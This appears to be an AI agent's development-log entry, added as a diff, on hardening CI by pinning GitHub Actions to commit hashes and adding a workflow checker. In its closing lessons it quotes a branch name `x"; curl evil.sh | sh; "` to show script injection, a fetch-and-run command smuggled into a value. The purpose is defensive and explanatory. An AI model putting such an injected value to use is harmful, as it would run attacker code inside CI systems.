@@ -777,3 +777,29 @@
 2. **A hash is a fingerprint for a file.** Change one byte of a download and its sha256 is completely different. Writing the fingerprint down in advance means a swapped file is caught *before* it runs, not after.
 3. **Waiting a week is a cheap defense.** Most hijacked packages are found and pulled within days. Only accepting releases that have been out for 7 days lets the rest of the world find them first.
 4. **Licenses are part of what you ship.** Every package comes with rules. Writing each one down, and making CI fail when a new package arrives unread, means a restrictive license can't sneak in through a dependency of a dependency.
+
+## 2026-11-23 (19:20 UTC): CI's GitHub Actions pinned to exact commits, and a checker that keeps them that way (0.5.47)
+
+**Why this, why now.** PR #5 had green CI and no conflicts, and the GPU prototype's remaining items need the rig or your decisions. Last session added a TASKS item: "Pin the CI workflow's GitHub Actions to commit hashes instead of version tags." It's the same idea as the pinned Python packages, applied to the tools that run our tests.
+
+**Shipped**
+- **Both workflows pinned.** `actions/checkout@v4` and `actions/setup-python@v5` are now named by full 40-character commit hash, with `# v4, as of 2026-11-23` / `# v5, ...` on the same line so a person can still read them. **Where the hashes came from:** this repo's own CI log. When GitHub runs a step it writes "Download action repository 'actions/checkout@v4' (SHA:11d5960a...)"; I read those lines from the 18:25 UTC run and used exactly those. So CI now runs the same code it ran today, not whatever the tag points at tomorrow.
+- **`persist-credentials: false` on checkout.** By default, checkout leaves the job's GitHub token in `.git/config`, where every later step (including our 800+ tests) could read it. Nothing needs it, so it's gone.
+- **One less outside action.** The site-check workflow used `actions/upload-artifact` to keep its report. Instead, the JSON report is now written to the run's **summary page** (you open the run and it's right there). Fewer outside actions = fewer things to trust.
+- **`python -m app.workflow_check`** (reads files only; CI runs it, and CI now also runs whenever a workflow file changes). It fails when:
+  - a `uses:` names a tag or branch (`@v4`, `@main`), a short or uppercase hash, or a docker image without a `@sha256:` digest;
+  - a pinned action has no version comment, or the same action is pinned to two different commits in two workflows;
+  - the action's owner isn't on a reviewed list (today only `actions`, GitHub's own; e.g. `tj-actions/...` fails even when pinned);
+  - a workflow has no top-level `permissions:`, or asks for any `write` access (top level or per job);
+  - it uses the `pull_request_target` or `workflow_run` triggers (both run with this repo's access on code someone else can start);
+  - `actions/checkout` doesn't set `persist-credentials: false`;
+  - a `run:` script contains `${{ ... }}` (values must go through `env:` instead).
+- **Proof.** 61 new tests, **825 total, all passing** (Python 3.11, installed from the lock). The checker passes on both real workflows (22 checks) and failed on the old ones (7 problems: 5 actions pinned only by tag, and 2 checkouts leaving the token behind). Then I broke the checker 16 ways on purpose (accept uppercase or 12-character hashes, miss the YAML `on:` quirk, ignore checkout tokens, ignore `${{ }}` in scripts, allow two hashes, accept any owner starting with "actions", ignore `write-all` or job-level write, skip the missing-permissions check, read only the first comment, accept a version anywhere in the comment, accept docker tags, forget `workflow_run`, skip flow-style `uses`, skip job-level reusable workflows). 15 were caught at once; the "version anywhere in the comment" one survived until I added a `# v4x` test case. Now all 16 are caught.
+- `pyyaml` (already in the lock, license already reviewed) is now listed in `requirements.txt`, because the checker uses it directly.
+- **Honest limits:** the checker can't prove a hash really is the release its comment says; mine came from GitHub's own log of our CI, which is about as good as it gets without looking at other repositories. Pinned actions don't update themselves; an optional Dependabot file for that is in USER_TODO (it opens pull requests, so it's your call). The site-check workflow's new summary step only runs after merging, when you click Run workflow. Nothing here touches the GPUs or the website.
+
+**What you learned**
+1. **A tag is a sticky note; a commit hash is a fingerprint.** `@v4` points wherever the action's owner (or someone who took over their account) moves it. A 40-character hash names one exact version of the code forever.
+2. **This attack really happened.** In March 2025 the popular `tj-actions/changed-files` action was hijacked and its tags moved to code that printed secrets into public CI logs. Workflows pinned by hash weren't affected.
+3. **Give tools the least access that works.** Our CI only needs to read the code, so its token is read-only and isn't left on disk afterwards. If something in CI ever goes wrong, there's less it can do.
+4. **`${{ }}` is copy-paste, not a variable.** GitHub pastes the value into the script *before* it runs, so a branch named `x"; curl evil.sh | sh; "` becomes part of your command. Putting it in `env:` makes it plain data.
